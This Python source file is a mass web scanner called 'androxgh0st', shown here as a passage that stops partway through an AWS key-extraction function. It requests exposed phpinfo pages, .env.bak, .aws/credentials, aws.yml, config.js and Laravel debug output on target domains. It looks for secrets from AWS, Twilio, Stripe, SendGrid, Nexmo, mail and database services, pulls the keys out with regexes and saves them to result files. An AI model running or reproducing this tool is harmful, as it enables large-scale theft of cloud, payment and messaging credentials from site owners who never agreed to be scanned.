# -*- coding: utf-8 -*-

import requests, os, sys
from colorama import init, Fore, Style
init(autoreset=True)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
from pystyle import Write, Colors, Colorate, Center

from datetime import datetime

# === Dated results directory ===
RESULTS_DIR = f"Results_{datetime.now().strftime('%Y-%m-%d-%H-%M')}"
try:
    os.makedirs(RESULTS_DIR, exist_ok=True)
except Exception:
    pass
def print_ascii():
  print()
  print(Center.XCenter(Colorate.Horizontal(Colors.red_to_green, r'''
██████╗ ██╗  ██╗██████╗     ██╗███╗   ██╗███████╗ ██████╗ 
██╔══██╗██║  ██║██╔══██╗    ██║████╗  ██║██╔════╝██╔═══██╗
██████╔╝███████║██████╔╝    ██║██╔██╗ ██║█████╗  ██║   ██║
██╔═══╝ ██╔══██║██╔═══╝     ██║██║╚██╗██║██╔══╝  ██║   ██║
██║     ██║  ██║██║         ██║██║ ╚████║██║     ╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝         ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ 
''', 1)))
  print(Center.XCenter(Colorate.Horizontal(Colors.yellow_to_green, r'''
                        ██████╗ ██╗   ██╗
                        ██╔══██╗╚██╗ ██╔╝
                        ██████╔╝ ╚████╔╝ 
                        ██╔══██╗  ╚██╔╝  
                        ██████╔╝   ██║   
                        ╚═════╝    ╚═╝   
''', 1)))
  print(Center.XCenter(Colorate.Horizontal(Colors.red_to_green, r'''
██████╗  ██████╗ ██████╗     ███╗   ███╗ █████╗ ██████╗ ██╗     ███████╗██╗   ██╗
██╔══██╗██╔═══██╗██╔══██╗    ████╗ ████║██╔══██╗██╔══██╗██║     ██╔════╝╚██╗ ██╔╝
██████╔╝██║   ██║██████╔╝    ██╔████╔██║███████║██████╔╝██║     █████╗   ╚████╔╝ 
██╔══██╗██║   ██║██╔══██╗    ██║╚██╔╝██║██╔══██║██╔══██╗██║     ██╔══╝    ╚██╔╝  
██████╔╝╚██████╔╝██████╔╝    ██║ ╚═╝ ██║██║  ██║██║  ██║███████╗███████╗   ██║   
╚═════╝  ╚═════╝ ╚═════╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   
''', 1)))
  print()

def ask(prompt: str) -> str:
    Write.Print(prompt, Colors.green_to_yellow, interval=0.005)
    return input().strip()
    
def _res(path: str) -> str:
    # Always save into the dated folder, normalizing legacy 'Results/...' and 'RESULT-...' paths.
    path = path.lstrip("/")
    if path.startswith("Results/"):
        path = path.replace("Results/", "", 1)
    return os.path.join(RESULTS_DIR, path)


from re import findall as reg

requests.packages.urllib3.disable_warnings()

from threading import *

from threading import Thread

from configparser import ConfigParser

from queue import Queue


list_region = '''us-east-1

us-east-2

us-west-1

us-west-2

af-south-1

ap-east-1

ap-south-1

ap-northeast-1

ap-northeast-2

ap-northeast-3

ap-southeast-1

ap-southeast-2

ca-central-1

eu-central-1

eu-west-1

eu-west-2

eu-west-3

eu-south-1

eu-north-1

me-south-1

sa-east-1'''

pid_restore = '.nero_swallowtail'


class Worker(Thread):

  def __init__(self, tasks):

    Thread.__init__(self)

    self.tasks = tasks

    self.daemon = True

    self.start()


  def run(self):

    while True:

      func, args, kargs = self.tasks.get()

      try: func(*args, **kargs)

      except Exception as e: print(e)

      self.tasks.task_done()


class ThreadPool:

  def __init__(self, num_threads):

    self.tasks = Queue(num_threads)

    for _ in range(num_threads): Worker(self.tasks)


  def add_task(self, func, *args, **kargs):

    self.tasks.put((func, args, kargs))


  def wait_completion(self):

    self.tasks.join()


class androxgh0st:


  def AWSLO(self,DOMAIN):

    headers = {

      'Connection': 'keep-alive',

      'Cache-Control': 'max-age=0',

      'Upgrade-Insecure-Requests': '1',

      'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',

      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',

      'Accept-Encoding': 'gzip, deflate',

      'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',

    }

    try:

      HADEH = "{}/_profiler/phpinfo".format(DOMAIN)

      REQ = requests.get(HADEH, headers=headers,

                 allow_redirects=False, timeout=3)

      if "PHP Variables" in REQ.text and "Environment" in REQ.text:

        if "AKIA" in REQ.text:

          print("[XXX] FOUND AWS {}".format(HADEH))

          SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "TWILIO" in REQ.text or "twilio" in REQ.text:

          print("[XXX] FOUND TWILIO {}".format(HADEH))

          SIMPEN = open(_res("RESULT-TWILIO.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "PLIVO" in REQ.text or "plivo" in REQ.text:

          print("[XXX] FOUND PLIVO {}".format(HADEH))

          SIMPEN = open(_res("RESULT-PLIVO.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "NEXMO" in REQ.text or "nexmo" in REQ.text:

          print("[XXX] FOUND NEXMO {}".format(HADEH))

          SIMPEN = open(_res("RESULT-NEXMO.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:

          print("[XXX] FOUND COINPAYMENTS {}".format(HADEH))

          SIMPEN = open(_res("RESULT-COINPAYMENTS.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "SG." in REQ.text or "sendgrid" in REQ.text:

          print("[XXX] FOUND SENDGRID {}".format(HADEH))

          SIMPEN = open(_res("RESULT-SENDGRID.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "mailgun" in REQ.text:

          print("[XXX] FOUND MAILGUN {}".format(HADEH))

          SIMPEN = open(_res("RESULT-MAILGUN.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "stripe" in REQ.text:

          print("[XXX] FOUND STRIPE {}".format(HADEH))

          SIMPEN = open(_res("RESULT-STRIPE.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "office365" in REQ.text:

          print("[XXX] FOUND OFFICE365 {}".format(HADEH))

          SIMPEN = open(_res("RESULT-OFFICE365.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "ionos" in REQ.text:

          print("[XXX] FOUND IONOS {}".format(HADEH))

          SIMPEN = open(_res("RESULT-IONOS.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "mandrillapp" in REQ.text:

          print("[XXX] FOUND MANDRILL {}".format(HADEH))

          SIMPEN = open(_res("RESULT-MANDRILL.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "auth.cloud.ovh.net" in REQ.text:

          print("[XXX] FOUND OVH {}".format(HADEH))

          SIMPEN = open(_res("RESULT-OVH.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "rds.amazonaws.com" in REQ.text:

          print("[XXX] FOUND RDSAMAZON {}".format(HADEH))

          SIMPEN = open(_res("RESULT-RDSAMAZON.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        elif "MAIL_PASSWORD" in REQ.text:

          print("[XXX] FOUND MAIL OTHER {}".format(HADEH))

          SIMPEN = open(_res("RESULT-MAIL-OTHER.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


        else:

          if "DB_USERNAME" in REQ.text:

            print("[XOX] FOUND DATABASE")

            SIMPEN = open(_res("RESULT-DATABASE.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          print("[XXX] FOUND PHPINFO {}".format(HADEH))

          SIMPEN = open(_res("RESULT-VARIABLE.txt"), "a+")

          SIMPEN.write(HADEH+"\n")


      else:

        HADEH = "{}/phpinfo.php".format(DOMAIN)

        REQ = requests.get(HADEH, headers=headers,

                   allow_redirects=True, timeout=3)

        if "PHP Variables" in REQ.text and "Environment" in REQ.text:

          if "AKIA" in REQ.text:

            print("[XXX] FOUND AWS {}".format(HADEH))

            SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "TWILIO" in REQ.text or "twilio" in REQ.text:

            print("[XXX] FOUND TWILIO {}".format(HADEH))

            SIMPEN = open(_res("RESULT-TWILIO.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "PLIVO" in REQ.text or "plivo" in REQ.text:

            print("[XXX] FOUND PLIVO {}".format(HADEH))

            SIMPEN = open(_res("RESULT-PLIVO.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "NEXMO" in REQ.text or "nexmo" in REQ.text:

            print("[XXX] FOUND NEXMO {}".format(HADEH))

            SIMPEN = open(_res("RESULT-NEXMO.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:

            print("[XXX] FOUND COINPAYMENTS {}".format(HADEH))

            SIMPEN = open(_res("RESULT-COINPAYMENTS.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "SG." in REQ.text or "sendgrid" in REQ.text:

            print("[XXX] FOUND SENDGRID {}".format(HADEH))

            SIMPEN = open(_res("RESULT-SENDGRID.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "mailgun" in REQ.text:

            print("[XXX] FOUND MAILGUN {}".format(HADEH))

            SIMPEN = open(_res("RESULT-MAILGUN.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "stripe" in REQ.text:

            print("[XXX] FOUND STRIPE {}".format(HADEH))

            SIMPEN = open(_res("RESULT-STRIPE.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "office365" in REQ.text:

            print("[XXX] FOUND OFFICE365 {}".format(HADEH))

            SIMPEN = open(_res("RESULT-OFFICE365.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "ionos" in REQ.text:

            print("[XXX] FOUND IONOS {}".format(HADEH))

            SIMPEN = open(_res("RESULT-IONOS.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "mandrillapp" in REQ.text:

            print("[XXX] FOUND MANDRILL {}".format(HADEH))

            SIMPEN = open(_res("RESULT-MANDRILL.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "auth.cloud.ovh.net" in REQ.text:

            print("[XXX] FOUND OVH {}".format(HADEH))

            SIMPEN = open(_res("RESULT-OVH.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "rds.amazonaws.com" in REQ.text:

            print("[XXX] FOUND RDSAMAZON {}".format(HADEH))

            SIMPEN = open(_res("RESULT-RDSAMAZON.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          elif "MAIL_PASSWORD" in REQ.text:

            print("[XXX] FOUND MAIL OTHER {}".format(HADEH))

            SIMPEN = open(_res("RESULT-MAIL-OTHER.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


          else:

            if "DB_USERNAME" in REQ.text:

              print("[XOX] FOUND DATABASE")

              SIMPEN = open(_res("RESULT-DATABASE.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            print("[XXX] FOUND PHPINFO {}".format(HADEH))

            SIMPEN = open(_res("RESULT-VARIABLE.txt"), "a+")

            SIMPEN.write(HADEH+"\n")


        else:

          HADEH = "{}/phpinfo".format(DOMAIN)

          REQ = requests.get(HADEH, headers=headers,

                     allow_redirects=True, timeout=3)

          if "PHP Variables" in REQ.text and "Environment" in REQ.text:

            if "AKIA" in REQ.text:

              print("[XXX] FOUND AWS {}".format(HADEH))

              SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "TWILIO" in REQ.text or "twilio" in REQ.text:

              print("[XXX] FOUND TWILIO {}".format(HADEH))

              SIMPEN = open(_res("RESULT-TWILIO.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "PLIVO" in REQ.text or "plivo" in REQ.text:

              print("[XXX] FOUND PLIVO {}".format(HADEH))

              SIMPEN = open(_res("RESULT-PLIVO.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "NEXMO" in REQ.text or "nexmo" in REQ.text:

              print("[XXX] FOUND NEXMO {}".format(HADEH))

              SIMPEN = open(_res("RESULT-NEXMO.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:

              print("[XXX] FOUND COINPAYMENTS {}".format(HADEH))

              SIMPEN = open(_res("RESULT-COINPAYMENTS.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "SG." in REQ.text or "sendgrid" in REQ.text:

              print("[XXX] FOUND SENDGRID {}".format(HADEH))

              SIMPEN = open(_res("RESULT-SENDGRID.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "mailgun" in REQ.text:

              print("[XXX] FOUND MAILGUN {}".format(HADEH))

              SIMPEN = open(_res("RESULT-MAILGUN.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "office365" in REQ.text:

              print("[XXX] FOUND OFFICE365 {}".format(HADEH))

              SIMPEN = open(_res("RESULT-OFFICE365.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "stripe" in REQ.text:

              print("[XXX] FOUND STRIPE {}".format(HADEH))

              SIMPEN = open(_res("RESULT-STRIPE.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "ionos" in REQ.text:

              print("[XXX] FOUND IONOS {}".format(HADEH))

              SIMPEN = open(_res("RESULT-IONOS.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "mandrillapp" in REQ.text:

              print("[XXX] FOUND MANDRILL {}".format(HADEH))

              SIMPEN = open(_res("RESULT-MANDRILL.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "auth.cloud.ovh.net" in REQ.text:

              print("[XXX] FOUND OVH {}".format(HADEH))

              SIMPEN = open(_res("RESULT-OVH.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "rds.amazonaws.com" in REQ.text:

              print("[XXX] FOUND RDSAMAZON {}".format(HADEH))

              SIMPEN = open(_res("RESULT-RDSAMAZON.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            elif "MAIL_PASSWORD" in REQ.text:

              print("[XXX] FOUND MAIL OTHER {}".format(HADEH))

              SIMPEN = open(_res("RESULT-MAIL-OTHER.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            else:

              if "DB_USERNAME" in REQ.text:

                print("[XOX] FOUND DATABASE")

                SIMPEN = open(_res("RESULT-DATABASE.txt"), "a+")

                SIMPEN.write(HADEH+"\n")


              print("[XXX] FOUND PHPINFO {}".format(HADEH))

              SIMPEN = open(_res("RESULT-VARIABLE.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


          else:

            HADEH = "{}/aws.yml".format(DOMAIN)

            REQ = requests.get(

              HADEH, headers=headers, allow_redirects=True, timeout=3)

            if "[default]" in REQ.text and "AKIA" in REQ.text:

              print("[XXX] FOUND AWS {}".format(HADEH))

              SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

              SIMPEN.write(HADEH+"\n")


            else:

              HADEH = "{}/.env.bak".format(DOMAIN)

              REQ = requests.get(

                HADEH, headers=headers, allow_redirects=True, timeout=3)

              if "APP_KEY" in REQ.text:

                if "AKIA" in REQ.text:

                  print("[XXX] FOUND AWS {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "TWILIO" in REQ.text or "twilio" in REQ.text:

                  print("[XXX] FOUND TWILIO {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-TWILIO.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "PLIVO" in REQ.text or "plivo" in REQ.text:

                  print("[XXX] FOUND PLIVO {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-PLIVO.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "NEXMO" in REQ.text or "nexmo" in REQ.text:

                  print("[XXX] FOUND NEXMO {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-NEXMO.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:

                  print("[XXX] FOUND COINPAYMENTS {}".format(

                    HADEH))

                  SIMPEN = open(_res("RESULT-COINPAYMENTS.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "SG." in REQ.text or "sendgrid" in REQ.text:

                  print("[XXX] FOUND SENDGRID {}".format(

                    HADEH))

                  SIMPEN = open(_res("RESULT-SENDGRID.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "mailgun" in REQ.text:

                  print("[XXX] FOUND MAILGUN {}".format(

                    HADEH))

                  SIMPEN = open(_res("RESULT-MAILGUN.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "office365" in REQ.text:

                  print("[XXX] FOUND OFFICE365 {}".format(

                    HADEH))

                  SIMPEN = open(_res("RESULT-OFFICE365.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "stripe" in REQ.text:

                  print("[XXX] FOUND STRIPE {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-STRIPE.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "ionos" in REQ.text:

                  print("[XXX] FOUND IONOS {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-IONOS.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "mandrillapp" in REQ.text:

                  print("[XXX] FOUND MANDRILL {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-MANDRILL.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "auth.cloud.ovh.net" in REQ.text:

                  print("[XXX] FOUND OVH {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-OVH.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "rds.amazonaws.com" in REQ.text:

                  print("[XXX] FOUND RDSAMAZON {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-RDSAMAZON.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                elif "MAIL_PASSWORD" in REQ.text:

                  print("[XXX] FOUND MAIL OTHER {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-MAIL-OTHER.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


                else:

                  print("[XXX] FOUND PHPINFO {}".format(HADEH))

                  SIMPEN = open(_res("RESULT-VARIABLE.txt"), "a+")

                  SIMPEN.write(HADEH+"\n")


              else:

                HADEH = "{}/info.php".format(DOMAIN)

                REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)

                if "PHP Variables" in REQ.text and "Environment" in REQ.text:

                  if "AKIA" in REQ.text:

                    print("[XXX] FOUND AWS {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  elif "TWILIO" in REQ.text or "twilio" in REQ.text:

                    print("[XXX] FOUND TWILIO {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-TWILIO.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")

                    

                  

                  elif "PLIVO" in REQ.text or "plivo" in REQ.text:

                    print("[XXX] FOUND PLIVO {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-PLIVO.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  elif "NEXMO" in REQ.text or "nexmo" in REQ.text:

                    print("[XXX] FOUND NEXMO {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-NEXMO.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")

                  

                  elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:

                    print("[XXX] FOUND COINPAYMENTS {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-COINPAYMENTS.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  elif "SG." in REQ.text or "sendgrid" in REQ.text:

                    print("[XXX] FOUND SENDGRID {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-SENDGRID.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  elif "mailgun" in REQ.text:

                    print("[XXX] FOUND MAILGUN {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-MAILGUN.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  elif "office365" in REQ.text:

                    print("[XXX] FOUND OFFICE365 {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-OFFICE365.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  elif "stripe" in REQ.text:

                    print("[XXX] FOUND STRIPE {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-STRIPE.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  elif "ionos" in REQ.text:

                    print("[XXX] FOUND IONOS {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-IONOS.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")

                    

                  elif "mandrillapp" in REQ.text:

                    print("[XXX] FOUND MANDRILL {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-MANDRILL.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  elif "auth.cloud.ovh.net" in REQ.text:

                    print("[XXX] FOUND OVH {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-OVH.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")

                    

                  elif "rds.amazonaws.com" in REQ.text:

                    print("[XXX] FOUND RDSAMAZON {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-RDSAMAZON.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  elif "MAIL_PASSWORD" in REQ.text:

                    print("[XXX] FOUND MAIL OTHER {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-MAIL-OTHER.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  else:

                    if "DB_USERNAME" in REQ.text:

                      print("[XOX] FOUND DATABASE")

                      SIMPEN = open(_res("RESULT-DATABASE.txt"), "a+")

                      SIMPEN.write(HADEH+"\n")

                      

                    print("[XXX] FOUND PHPINFO {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-VARIABLE.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                else:

                  # Missconfigure aws credentials

                  HADEH = "{}/.aws/credentials".format(DOMAIN)

                  REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)

                  if "[default]" in REQ.text and "AKI" in REQ.text:

                    print("[XXX] FOUND AWS {}".format(HADEH))

                    SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

                    SIMPEN.write(HADEH+"\n")


                  else:

                    # Missconfigure admin

                    HADEH = "{}".format(DOMAIN)

                    REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)

                    if "AKIA" in REQ.text and "accessKeyId" in REQ.text:

                      print("[XXX] FOUND AWS {}".format(HADEH))

                      SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

                      SIMPEN.write(HADEH+"\n")


                    else:

                      # Missconfigure aws

                      HADEH = "{}/config/aws.yml".format(DOMAIN)

                      REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)

                      if "AKI" in REQ.text and "access_key_id" in REQ.text:

                        print("[XXX] FOUND AWS {}".format(HADEH))

                        SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

                        SIMPEN.write(HADEH+"\n")


                      else:

                        # DEBUG LARAVEL

                        HADEH = "{}".format(DOMAIN)

                        HPOST = {'somekey': 'somevalue'}

                        REQ = requests.get(HADEH, headers=headers, data=HPOST, allow_redirects=True, timeout=3)

                        if "APP_KEY" in REQ.text:

                          if "AKIA" in REQ.text:

                            print("[XXX] FOUND AWS {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")


                          elif "TWILIO" in REQ.text or "twilio" in REQ.text:

                            print("[XXX] FOUND TWILIO {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-TWILIO.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")

                            

                          

                          elif "PLIVO" in REQ.text or "plivo" in REQ.text:

                            print("[XXX] FOUND PLIVO {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-PLIVO.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")


                          elif "NEXMO" in REQ.text or "nexmo" in REQ.text:

                            print("[XXX] FOUND NEXMO {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-NEXMO.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")

                          

                          elif "COINPAYMENTS" in REQ.text or "coinpayments" in REQ.text:

                            print("[XXX] FOUND COINPAYMENTS {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-COINPAYMENTS.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")


                          elif "SG." in REQ.text or "sendgrid" in REQ.text:

                            print("[XXX] FOUND SENDGRID {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-SENDGRID.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")


                          elif "mailgun" in REQ.text:

                            print("[XXX] FOUND MAILGUN {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-MAILGUN.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")


                          elif "office365" in REQ.text:

                            print("[XXX] FOUND OFFICE365 {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-OFFICE365.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")


                          elif "ionos" in REQ.text:

                            print("[XXX] FOUND IONOS {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-IONOS.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")

                          elif "stripe" in REQ.text:

                            print("[XXX] FOUND STRIPE {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-STRIPE.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")

                            

                          elif "mandrillapp" in REQ.text:

                            print("[XXX] FOUND MANDRILL {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-MANDRILL.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")

                            

                          elif "MAIL_PASSWORD" in REQ.text:

                            print("[XXX] FOUND MAIL OTHER {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-MAIL-OTHER.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")

                            

                          elif "rds.amazonaws.com" in REQ.text:

                            print("[XXX] FOUND RDSAMAZON {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-RDSAMAZON.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")

                            

                          elif "auth.cloud.ovh.net" in REQ.text:

                            print("[XXX] FOUND OVH {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-OVH.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")

                          else:

                            print("[XXX] FOUND PHPINFO {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-VARIABLE.txt"), "a+")

                            SIMPEN.write(HADEH+"\n") 

                        else:

                          HADEH = "{}/config.js".format(DOMAIN)

                          REQ = requests.get(HADEH, headers=headers, allow_redirects=True, timeout=3)

                          if "ASIA" in REQ.text and "accessKeyId" in REQ.text and "AKIA" in REQ.text:

                            print("[XXX] FOUND AWS {}".format(HADEH))

                            SIMPEN = open(_res("RESULT-AWS.txt"), "a+")

                            SIMPEN.write(HADEH+"\n")

                          else:

                            print("[INFO] No exposure {}".format(DOMAIN))

                            

    except Exception as e:

      print("{} -> error" .format(DOMAIN))

      #print(e)

  def nexmo(self, text, url):

    try:    

      if "NEXMO_KEY" in text:

        if "NEXMO_KEY=" in text:

          method = '/.env'

          try:

            nexmo_1 = reg("\nNEXMO_KEY=(.*?)\n", text)[0]

          except:

            nexmo_1 = ''

          try:

            nexmo_2 = reg("\nNEXMO_SECRET=(.*?)\n", text)[0]

          except:

            nexmo_2 = ''

        elif "<td>NEXMO_KEY</td>" in text:

          method = 'debug'

          try:

            nexmo_1 = reg(r"<td>NEXMO_KEY</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            nexmo_1 = ''

          try:

            nexmo_2 = reg(r"<td>NEXMO_SECRET</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            nexmo_2 = ''

        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nNEXMO_KEY: '+str(nexmo_1)+'\nNEXMO_SECRET: '+str(nexmo_2)

        remover = str(build).replace('\r', '')

        save = open(_res('NEXMO_KEY.txt'), 'a')

        save.write(remover+'\n\n')

        save.close()

        return True

      else:

        return False

    except:

      return False


  def stripe(self, text, url):

    try:    

      if "STRIPE_KEY" in text:

        if "STRIPE_KEY=" in text:

          method = '/.env'

          try:

            stripe_1 = reg("\nSTRIPE_KEY=(.*?)\n", text)[0]

          except:

            stripe_1 = ''

          try:

            stripe_2 = reg("\nSTRIPE_SECRET=(.*?)\n", text)[0]

          except:

            stripe_2 = ''

        elif "<td>STRIPE_KEY</td>" in text:

          method = 'debug'

          try:

            stripe_1 = reg(r"<td>STRIPE_KEY</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            stripe_1 = ''

          try:

            stripe_2 = reg(r"<td>STRIPE_SECRET</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            stripe_2 = ''

        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_1)+'\nSTRIPE_SECRET: '+str(stripe_2)

        remover = str(build).replace('\r', '')

        save = open(_res('STRIPE_KEY.txt'), 'a')

        save.write(remover+'\n\n')

        save.close()

        return True

      else:

        return False

    except:

      return False


  def get_aws_region(self, text):

    reg = False

    for region in list_region.splitlines():

      if str(region) in text:

        return region

        break


  def get_aws_data(self, text, url):

    try:

      if "AWS_ACCESS_KEY_ID" in text:

        if "AWS_ACCESS_KEY_ID=" in text:

          method = '/.env'

          try:

            aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]

          except:

            aws_key = ''

          try:

